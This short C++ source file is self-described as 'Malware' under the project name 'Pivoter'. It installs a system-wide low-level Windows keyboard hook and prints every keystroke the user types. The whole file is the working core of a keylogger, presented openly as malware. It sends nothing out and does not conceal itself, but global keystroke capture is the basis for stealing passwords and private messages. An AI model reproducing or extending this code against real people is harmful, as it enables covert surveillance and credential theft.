/*
	Project name: Pivoter
	Project 1-Word Description: Malware
	Author: Kevin Jerebica ( Osamu-KJ )
*/

#include <iostream>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include "codes.h"

HHOOK keyboard_events_hook; 

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
		DWORD virt_code = kbd_struct->vkCode; 

		std::string string_key_code = VIRTUAL_KEY_CODE_TABLE[virt_code].name; 
		std::cout << "[!!] Key pressed: " << string_key_code << std::endl; 
	}
	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
}

int main() {
	
	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 
 
	// EVENT LOOP
	while (GetMessage(NULL, NULL, 0, 0)); 

	UnhookWindowsHookEx(keyboard_events_hook);

	return 0; 
}
